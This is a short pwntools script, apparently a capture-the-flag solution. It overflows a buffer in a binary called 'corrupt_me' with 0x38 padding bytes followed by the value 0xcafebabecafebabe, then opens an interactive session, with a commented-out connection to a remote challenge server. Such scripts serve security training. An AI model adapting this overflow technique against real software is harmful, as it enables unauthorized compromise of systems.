from pwn import *

e = ELF('./corrupt_me')
r = process('./corrupt_me')
#r = remote('34.64.219.95', 19507)

DUMMY = b'\x41' * 0x38
PAYLOAD = p64(0xcafebabecafebabe)

EXPLOIT = DUMMY + PAYLOAD

print(EXPLOIT)

r.sendline(EXPLOIT)

r.interactive()